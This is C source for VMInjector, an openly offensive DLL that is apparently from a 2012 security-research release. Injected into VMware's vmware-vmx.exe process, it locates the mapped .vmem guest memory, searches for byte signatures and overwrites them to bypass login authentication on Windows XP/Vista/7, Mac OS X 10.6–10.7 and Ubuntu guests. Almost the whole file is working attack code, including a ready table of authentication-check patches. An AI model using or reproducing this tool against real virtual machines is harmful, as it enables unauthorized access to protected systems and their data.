/*
 *
 * VMInjector x86 DLL v0.1 (c) 2012 by Marco Batista / Secforce <marco.batista@secforce.com>
 * 
 * This works by parsing memory space owned by the vmware-vmx.exe process
 * and locating the memory-mapped .vmem file, which corresponds to the 
 * guest's RAM image. In 32bit, it traverses potentially non-contiguous memory pages 
 * looking for a given signature and patches the signature in-memory allowing
 * to bypass authentication. 
 *
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "string.h"

#define MAX_MEM_RANGE 0x80000000 // stay out of kernel space (32bit)

typedef DWORD (__stdcall *MYPROC)(HANDLE, LPVOID, LPTSTR, DWORD);

MYPROC GetMappedFileName;

DWORD MemoryMapperThread();

//Calculate how many bytes are left in a given memory page based on a pointer's current location within the page
DWORD GetMemorySizeLeft(void *);

//Locate the next valid page of memory that corresponds to the mapped .vmem file
DWORD GetNextMemoryAddress(DWORD);

//Patches the memory location given by a pointer to the beginning of the signature found in memory, the patch to apply, the patch offset and patch length  
void DoInjectionRoutine(void *,unsigned char *,size_t, size_t);

DWORD FindSignature(DWORD ,size_t , unsigned char *, size_t ,unsigned char *);


typedef struct signatures {
	char *sig; //signature
	char *sig_mask; //signature mask
	int sig_length; //byte size of signature
	size_t patchoffset; //number of bytes to advance before writing the signature
	char *patch; //patch to apply
	int patch_length; //byte size of patch 
	char *name; //os name 
}SIG;

	//Signature, signature mask, size of signature, patching offset (number of bytes where to write the patch), patch to apply, size of patch
SIG list_sig[] = { 
	{"\x00\x48\x3B\xC6\x0F\x85\x00\x00\x00\x00\xB8", "xxxxxx????x", 11, 4, "\x90\x90\x90\x90\x90\x90", 6, "Windows 7 x64 SP0-SP1 and Windows Vista x64 SP2"}, 

	{"\x83\xf8\x10\x75\x13\xb0\x01\x8b", "xxxxxxxx", 8, 0, "\x83\xf8\x10\x90\x90\xb0\x01\x8b", 8, "Windows 7 x86 SP0 and Windows Vista x86 SP0, SP1, SP2 x86"}, 

	{"\x83\xF8\x10\x0F\x85\x50\x94\x00\x00\xB0\x01\x8B", "xxxxxxxxxxxx", 12, 0, "\x83\xF8\x10\x90\x90\x90\x90\x90\x90\xB0\x01\x8B", 12,"Windows 7 x86 SP1"}, 

	{"\x83\xF8\x10\x75\x11\xB0\x01\x8B", "xxxxxxxx", 8, 0, "\x83\xF8\x10\x90\x90\xB0\x01\x8B", 8, "Windows XP x86 SP2-3"}, 

	{"\x41\xbf\xf6\xc8\xff\xff\x48\xc7\x85\x88", "xxxxxxxxxx", 10, 0, "\x41\xbf\x00\x00\x00\x00\x48\xc7\x85\x88", 10,"MAC OS X 10.6.4 x64"}, 

	{"\x41\xbf\xf6\xc8\xff\xff", "xxxxxx", 6, 0, "\x41\xbf\x00\x00\x00\x00", 6, "MAC OS X 10.6.8 x64"}, 

	{"\xc7\x85\x80\xf6\xff\xff\xf6\xc8\xff\xff", "xxxxxxxxxx", 10, 0, "\xc7\x85\x80\xf6\xff\xff\x00\x00\x00\x00", 10,"MAC OS X 10.6.8 x32"}, 
	
	{"\x0f\xb6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x89\xd8\xeb\x02\x31\xc0\x48\x83\xc4\x78\x5b\x41\x5c\x41\x5d\x41\x5e\x41\x5f\x5d\xc3", "xx????????????xxxxxxxxxxxxxxxxxxxxx", 35, 0, "\x31\xdb\xff\xc3", 4,"MAC OS X 10.7.3 x64"}, 
	
	{"\x83\xF8\x1F\x89\xC7\x74", "xxxxxx", 6, 0, "\xBF\x00\x00\x00\x00\xEB", 6,"UBUNTU 11.10, 11.04, 12.04 x86"}, //does not bypass GUI.. 

	{"\x83\xF8\x1F\x89\xC5\x74", "xxxxxx", 6, 0, "\xBD\x00\x00\x00\x00\xEB", 6,"UBUNTU 11.10, 11.04, 12.04 x64"} //does not bypass GUI.. 
};

#define CountSigs (sizeof(list_sig) / sizeof(list_sig[0])) //defines the number of signatures available in the static array

BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
	HANDLE hThread;
	DWORD lpThreadId;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if(AllocConsole()) {
			freopen("CONOUT$", "w", stdout);
			freopen("CONIN$", "r", stdin);
			SetConsoleTitle("VMInjector x86 DLL v0.1 (c) 2012 by Marco Batista");
			SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
			printf("[+]DLL loaded.\n");
		}
		hThread=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)MemoryMapperThread,NULL,NULL,&lpThreadId);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

    return true;
}


DWORD MemoryMapperThread() {
	DWORD ddMemoryAddress;
	DWORD ddMemoryLeft;
	DWORD ptrPossible;
	HMODULE hPSAPI;


	hPSAPI=LoadLibrary("psapi.dll");
	if (hPSAPI==NULL) return false;
	GetMappedFileName=(MYPROC)GetProcAddress(hPSAPI,"GetMappedFileNameA");
	if (GetMappedFileName==NULL) return false;

	ddMemoryAddress=GetNextMemoryAddress(0);
	if(ddMemoryAddress==NULL){
		printf("[!]No mapped file .vmem?");
		return false;	
	}

	
	printf("[+]Available OS signatures: ");
	for(int i=0; i<CountSigs ;i++){
		printf("\n[%d] %s",i,list_sig[i].name);
	}
	int i=100;
	while(i<0 || i>=CountSigs){
		printf("\n[+]Select OS to unlock: ");
		scanf("%d",&i);
	}

	printf("\n[+]Looking for: %s ",list_sig[i].name);
	
	while(ddMemoryAddress<MAX_MEM_RANGE) {
		if(ddMemoryAddress==NULL){
			printf("[!]Memory address = NULL, getting the next .vmem mapped address");
			ddMemoryAddress=GetNextMemoryAddress(ddMemoryAddress);
			continue;
		}
		ddMemoryLeft=GetMemorySizeLeft((void *)ddMemoryAddress);
		if(ddMemoryLeft==NULL){
			printf("[!]Memory left = NULL, getting the next .vmem mapped address");
			ddMemoryAddress=GetNextMemoryAddress(ddMemoryAddress);
			continue;
		}
		
		ptrPossible=FindSignature(ddMemoryAddress,ddMemoryLeft,(unsigned char *)list_sig[i].sig,list_sig[i].sig_length,(unsigned char *)list_sig[i].sig_mask);
		if(ptrPossible!=NULL){
			break;				
		}

		ddMemoryAddress=GetNextMemoryAddress(ddMemoryAddress);
	}

	if(ptrPossible!=NULL){
		printf(" <-- Found Signature Match\n");
		DoInjectionRoutine((void *)ptrPossible,(unsigned char *)list_sig[i].patch,list_sig[i].patchoffset,list_sig[i].patch_length);
	}else
		printf(" <-- No Signature Found!\n");
	
	FreeLibrary(hPSAPI);
	system("pause");
	FreeConsole();
	FreeLibraryAndExitThread(GetModuleHandle("vminjector32.dll"),NULL);
	return true;
}

void DoInjectionRoutine(void *pvAPointer,unsigned char *patch,size_t patchoffset,size_t patch_length) {
	void *pBasePtr;
	
	pBasePtr = (unsigned char *)pvAPointer+patchoffset;
	memcpy(pBasePtr,patch,patch_length);
	return;
}


DWORD FindSignature(DWORD base_addr,size_t base_len, unsigned char *sig_str, size_t sig_len, unsigned char *sig_mask) {
    DWORD pBasePtr;
    DWORD pEndPtr;
    size_t i;

	pBasePtr = base_addr;
	pEndPtr = (DWORD)(((unsigned char *)base_addr+base_len));

	while(pBasePtr < pEndPtr) {
		//Identify where the first and last bytes of sig_str[] exist in memory, 
		//and make sure they are the appropriate number of bytes apart before
		//matching the signature and mask with the memory block found. 
		if(pBasePtr==NULL ||IsBadReadPtr((void *)pBasePtr,sig_len)){
			pBasePtr++;
			continue;
		}
		if(((unsigned char *)pBasePtr)[0] != sig_str[0]) { //there is function memchar that might work better....?
			pBasePtr++;
			continue;
		}
		if(((unsigned char *)pBasePtr)[sig_len-1] != sig_str[sig_len-1]) {
			pBasePtr++;
			continue;
		}
		for(i = 0;i < sig_len;i++) {
			if(sig_mask[i] == 0x3F)
				continue;
			else{
				if(sig_str[i] != ((unsigned char *)pBasePtr)[i])
					break;
			}
		} 

		// If 'i' reached the end, we know we have a match!
		if(i == sig_len)
			return pBasePtr;

		pBasePtr++;
	}
	return NULL;
}



DWORD GetMemorySizeLeft(void *pvAPointer) {
	MEMORY_BASIC_INFORMATION anMBI;
	void *pvMemoryEnd;
	DWORD ddSizeLeft;

	if(VirtualQuery(pvAPointer,&anMBI,sizeof(anMBI))<sizeof(anMBI)) 
		return(0);
	pvMemoryEnd=(unsigned char *)anMBI.BaseAddress+anMBI.RegionSize;
	ddSizeLeft=(DWORD)(((unsigned char *)pvMemoryEnd-(unsigned char *)pvAPointer));
	return(ddSizeLeft);
}

DWORD GetNextMemoryAddress(DWORD ddCurrentAddress) { 
	DWORD ddMemoryAddress;
	DWORD ddAddressIncrement;
	SYSTEM_INFO aSystemInfo;
	char szFilename[MAX_PATH+1];
	char szFNAME[_MAX_FNAME+1];
	char szEXT[_MAX_FNAME+1];

	GetSystemInfo(&aSystemInfo);
	ddAddressIncrement=aSystemInfo.dwAllocationGranularity;
	ddMemoryAddress=ddCurrentAddress;
	ddMemoryAddress=(ddMemoryAddress / ddAddressIncrement) * ddAddressIncrement; 
	while(ddMemoryAddress<MAX_MEM_RANGE) {
		ddMemoryAddress+=ddAddressIncrement;
		if(IsBadReadPtr((void *)ddMemoryAddress,1))
			continue;
		if(GetMappedFileName(GetCurrentProcess(),(void *)ddMemoryAddress,szFilename,MAX_PATH)==0)
		{
			continue;
		}
		memset(szFNAME,0,sizeof(szFNAME));
		memset(szEXT,0,sizeof(szEXT));
		_splitpath(szFilename,NULL,NULL,szFNAME,szEXT);
		if(stricmp(szEXT,".vmem")==0)
			return(ddMemoryAddress);
	}
	return(-1);
}